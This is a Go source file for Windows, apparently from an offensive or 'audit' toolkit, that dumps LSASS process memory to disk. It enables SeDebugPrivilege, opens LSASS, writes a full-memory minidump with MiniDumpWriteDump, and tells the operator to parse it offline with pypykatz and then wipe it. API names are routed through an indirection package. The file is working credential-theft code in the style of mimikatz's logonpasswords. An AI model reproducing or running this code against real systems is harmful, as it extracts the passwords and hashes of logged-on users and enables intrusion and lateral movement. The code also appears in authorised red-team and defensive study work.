//go:build windows

package audit

// sekurlsa::logonpasswords support — LSASS process memory acquisition.
//
// This module never parses credentials in-process: it acquires a
// full-memory minidump of LSASS with dbghelp's MiniDumpWriteDump (the same
// snapshot primitive procdump uses), writes it to an operator-visible path,
// and reports it back. Offline parsing (pypykatz and friends) is
// deliberately out of tree — the dump plus documented use is the module.
//
// Requirements mirror the capability's real prerequisites: an elevated token
// plus SeDebugPrivilege, and no LSA Protection (RunAsPPL / Credential Guard)
// on the target. When LSASS is PPL-protected or LSASS does not answer,
// MiniDumpWriteDump fails with access-denied and DumpLSASS returns the
// actionable reason instead of a generic error.
//
// Like the SAM module, recovered material is never written to logs — only
// progress lines, the output path and the byte count.

import (
	"fmt"
	"os"
	"path/filepath"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"

	"github.com/DevCop95/obliteratus/internal/winname"
)

// MiniDumpType selects the minidump flavour. Full memory is the only one
// that carries credential material (stacks and handles do not).
const miniDumpWithFullMemory = 0x00000002

var (
	dbghelp             = windows.NewLazySystemDLL(winname.LibDbghelp)
	procMiniDumpWrite   = dbghelp.NewProc(winname.MiniDump)
	procCreateFileW     = windows.NewLazySystemDLL(winname.LibKernel32).NewProc(winname.CreateFile)
	procOpenProcessFull = windows.NewLazySystemDLL(winname.LibKernel32).NewProc(winname.OpenProc)
)

// DumpLSASS writes a full-memory minidump of pid (normally LSASS) to dir and
// returns its path and size. em may be nil.
func DumpLSASS(pid int, dir string, em Emitter) (string, int64, error) {
	if dir == "" {
		dir = os.TempDir()
	}
	if err := enablePrivilege("SeDebugPrivilege"); err != nil {
		return "", 0, err
	}
	emit(em, fmt.Sprintf("LSASS: opening PID %d (PROCESS_QUERY_INFORMATION|PROCESS_VM_READ)", pid), "INFO")

	const (
		queryInfo = 0x0400 // PROCESS_QUERY_INFORMATION
		vmRead    = 0x0010 // PROCESS_VM_READ
	)
	hProc, _, errno := procOpenProcessFull.Call(
		uintptr(queryInfo|vmRead), 0, uintptr(pid),
	)
	if hProc == 0 {
		return "", 0, fmt.Errorf("lsass: OpenProcess PID %d: %v (elevation required; PPL-protected LSASS denies even admins — see the MK-LSASS-PPL audit finding)", pid, errno)
	}
	defer windows.CloseHandle(windows.Handle(hProc))

	out := filepath.Join(dir, fmt.Sprintf("obl-lsass-%d-%s.dmp", pid, time.Now().Format("20060102-150405")))
	path16, err := windows.UTF16PtrFromString(out)
	if err != nil {
		return "", 0, err
	}
	const (
		genericWrite      = 0x40000000
		createAlways      = 2
		fileAttributeNorm = 0x80
	)
	hFile, _, errno := procCreateFileW.Call(
		uintptr(unsafe.Pointer(path16)),
		uintptr(genericWrite), 0, 0,
		uintptr(createAlways), uintptr(fileAttributeNorm), 0,
	)
	if hFile == 0 || windows.Handle(hFile) == windows.InvalidHandle {
		return "", 0, fmt.Errorf("lsass: create %s: %v", out, errno)
	}
	defer windows.CloseHandle(windows.Handle(hFile))

	emit(em, fmt.Sprintf("LSASS: %s (MiniDumpWithFullMemory) — this takes a moment", winname.MiniDump), "INFO")
	r, _, errno := procMiniDumpWrite.Call(
		hProc, uintptr(pid), hFile,
		uintptr(miniDumpWithFullMemory),
		0, 0, 0,
	)
	if r == 0 {
		_ = os.Remove(out)
		return "", 0, fmt.Errorf("lsass: %s PID %d: %v (RunAsPPL/Credential Guard or EDR blocking handle access — see the MK-LSASS-PPL audit finding)", winname.MiniDump, pid, errno)
	}

	st, err := os.Stat(out)
	if err != nil {
		return "", 0, fmt.Errorf("lsass: stat dump: %w", err)
	}
	emit(em, fmt.Sprintf("LSASS: dump written (%d bytes) — parse offline (pypykatz), then wipe", st.Size()), "SUCCESS")
	return out, st.Size(), nil
}
